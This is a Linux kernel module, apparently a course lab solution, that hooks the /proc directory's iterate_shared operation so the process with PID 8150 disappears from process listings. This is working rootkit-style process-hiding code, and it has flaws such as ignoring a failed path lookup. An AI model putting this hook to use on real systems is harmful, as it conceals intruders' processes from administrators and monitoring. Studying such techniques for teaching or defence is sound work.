#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/namei.h>


static int (*orig_iterate_shared)(struct file* f, struct dir_context* d_ctx);
static int new_iterate_shared(struct file* f, struct dir_context* d_ctx);
static int new_filldir_t(struct dir_context* d_ctx, const char* name, int len,
			loff_t off, u64 ino, unsigned int d_type);

static struct path proc_path;
static struct dir_context* orig_d_ctx;
static const struct file_operations* orig_fops;
static struct file_operations new_fops;


static int __init mod_start(void) {
	if (kern_path("/proc", 0, &proc_path) != 0) {			//essentially operations_struct at /proc - being the highest level of the kernel
		printk(KERN_ALERT "Failed to get path to /proc\n");
	}
	orig_fops = proc_path.dentry->d_inode->i_fop;
	orig_iterate_shared = proc_path.dentry->d_inode->i_fop->iterate_shared;
	new_fops = *proc_path.dentry->d_inode->i_fop;
	new_fops.iterate_shared = new_iterate_shared;
	proc_path.dentry->d_inode->i_fop = &new_fops;
	return 0;
}

static void __exit mod_stop(void) {
	printk(KERN_ALERT "Goodbye, World\n");
	proc_path.dentry->d_inode->i_fop = orig_fops;
	return;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mark O'Neill");
MODULE_DESCRIPTION("Proc/VFS Lab Solution");
module_init(mod_start);
module_exit(mod_stop); 

int new_filldir_t(struct dir_context* d_ctx, const char* name, int len,
		loff_t off, u64 ino, unsigned int d_type) {
	if (strncmp(name, "8150", sizeof("8150")) == 0) {
		printk(KERN_ALERT "8150 hidden\n");
		return 0;
	}
	return orig_d_ctx->actor(orig_d_ctx, name, len, off, ino, d_type);
}

int new_iterate_shared(struct file* f, struct dir_context* d_ctx) {
	int ret;
	struct dir_context new_ctx = {
		.actor = new_filldir_t,
		.pos = d_ctx->pos
	};
	orig_d_ctx = d_ctx;
	ret = orig_iterate_shared(f, &new_ctx);
	d_ctx->pos = new_ctx.pos;
	return ret;
}
